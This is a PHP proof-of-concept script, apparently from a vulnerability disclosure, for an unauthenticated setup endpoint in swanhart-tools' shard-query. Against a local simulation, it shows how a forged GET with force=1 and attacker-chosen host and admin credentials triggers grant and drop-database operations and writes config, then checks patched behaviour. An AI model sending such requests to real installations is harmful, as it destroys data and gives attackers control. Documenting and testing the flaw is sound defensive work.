<?php
require __DIR__ . '/vulnerable_app/configure2_sim.php';

function out(string $label, $value = null): void
{
    echo $label . "\n";
    if ($value !== null) {
        echo json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n";
    }
}

$attackParams = [
    'type' => 'n',
    'force' => '1',
    'host' => 'attacker-controlled.example',
    'username' => 'evil_admin',
    'password' => 'evil_password',
    'schema_name' => 'victim_grid',
    'column' => 'id',
    'column_datatype' => 'integer',
    'store' => 'mysql',
];

out('[*] PoC context:', [
    'finding' => 'greenlion/swanhart-tools CAND-ec6432b667a9',
    'vulnerability' => 'Unauthenticated setup/configuration endpoint; InvAudit labelled it CSRF',
    'root_cause' => [
        'shard-query/ui/awsconfig/configure2.php exits only when $_REQUEST is empty',
        'the script uses $_REQUEST to run grant/drop/create database operations',
        'the script writes bootstrap/config files based on request parameters',
        'no authentication, setup secret, install lock, CSRF token, or method restriction is enforced',
    ],
    'safety' => 'This PoC is a local-only simulation. It never connects to MySQL or any external service.',
]);

out('\n[*] Attack 1: forged unauthenticated GET with force=1 against vulnerable configure2 path.');
$node = local_reset_swanhart_state();
$getAttack = local_run_configure2($node, 'GET', $attackParams, false);
out('[*] Vulnerable GET setup result:', $getAttack);

$hasGrant = count(array_filter($getAttack['state_changing_sql_operations'], fn($sql) => stripos($sql, 'grant all on *.*') === 0)) > 0;
$hasDrop = count(array_filter($getAttack['state_changing_sql_operations'], fn($sql) => stripos($sql, 'drop database') === 0)) > 0;
$hasWrite = count($getAttack['file_writes']) > 0 && str_contains($getAttack['file_writes'][0]['content'], 'attacker-controlled.example');

if ($getAttack['http_status'] !== 200 || $getAttack['auth_checks'] !== 0 || !$hasGrant || !$hasDrop || !$hasWrite) {
    fwrite(STDERR, "[FAIL] Expected unauthenticated GET to perform DB setup and config write.\n");
    exit(1);
}
out('[PASS] Vulnerability reproduced: unauthenticated GET triggered grant/drop/create and wrote attacker-controlled config.');

out('\n[*] Control 1: same request without force=1 shows the built-in destructive-action bypass link.');
$node = local_reset_swanhart_state();
$withoutForce = $attackParams;
unset($withoutForce['force']);
$blockedByPrompt = local_run_configure2($node, 'GET', $withoutForce, false);
out('[*] Vulnerable GET without force result:', $blockedByPrompt);
if ($blockedByPrompt['http_status'] !== 409 || !str_contains($blockedByPrompt['body']['force_url'], 'force=1')) {
    fwrite(STDERR, "[FAIL] Expected no-force request to return a force=1 destructive setup URL.\n");
    exit(1);
}
out('[PASS] Control passed: force=1 is enough to bypass the existing-data prompt.');

out('\n[*] Control 2: same forged GET against patched path.');
$node = local_reset_swanhart_state();
$patchedGet = local_run_configure2($node, 'GET', $attackParams, true);
out('[*] Patched GET result:', $patchedGet);
if ($patchedGet['http_status'] !== 405 || count($patchedGet['state_changing_sql_operations']) !== 0 || count($patchedGet['file_writes']) !== 0) {
    fwrite(STDERR, "[FAIL] Expected patched GET to be rejected before DB/file state changes.\n");
    exit(1);
}
out('[PASS] Patched control passed: GET setup is rejected before any state change.');

out('\n[*] Control 3: patched POST without setup token.');
$node = local_reset_swanhart_state();
$patchedPostNoToken = local_run_configure2($node, 'POST', $attackParams, true);
out('[*] Patched POST without token result:', $patchedPostNoToken);
if ($patchedPostNoToken['http_status'] !== 403 || count($patchedPostNoToken['state_changing_sql_operations']) !== 0) {
    fwrite(STDERR, "[FAIL] Expected patched POST without setup token to be rejected.\n");
    exit(1);
}
out('[PASS] Patched control passed: POST without setup token is rejected.');

out('\n[*] Control 4: patched POST with valid setup token.');
$node = local_reset_swanhart_state();
$legitParams = $attackParams;
$legitParams['setup_token'] = 'server-side-setup-token';
$patchedPost = local_run_configure2($node, 'POST', $legitParams, true);
out('[*] Patched POST with valid setup token result:', $patchedPost);
if ($patchedPost['http_status'] !== 200 || count($patchedPost['state_changing_sql_operations']) === 0 || count($patchedPost['file_writes']) === 0) {
    fwrite(STDERR, "[FAIL] Expected patched POST with setup token to perform intended setup.\n");
    exit(1);
}
out('[PASS] Patched positive control passed: an authenticated setup POST remains possible.');

echo "\nVULNERABLE: swanhart-tools CAND-ec6432b667a9 reproduced successfully.\n";
